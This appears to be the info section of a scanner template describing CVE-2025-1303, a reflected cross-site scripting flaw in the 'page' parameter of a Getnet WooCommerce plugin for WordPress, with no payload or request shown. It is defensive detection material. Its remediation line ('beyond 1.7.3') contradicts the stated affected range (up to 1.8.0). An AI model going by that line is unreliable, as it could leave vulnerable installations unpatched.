id: CVE-2025-1303

info:
  name: Plugin Oficial – Getnet para WooCommerce <= 1.8.0 - Cross-Site Scripting
  author: Shivam Kamboj
  severity: medium
  description: |
    The Plugin Oficial – Getnet para WooCommerce plugin for WordPress is vulnerable to Reflected Cross-Site Scripting in all versions up to, and including, 1.8.0 due to insufficient input sanitization and output escaping on the 'page' parameter. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.
  impact: |
    Unauthenticated attackers can execute scripts in users' browsers, potentially stealing data or performing actions on their behalf.
  remediation: |
    Update to the latest version beyond 1.7.3.
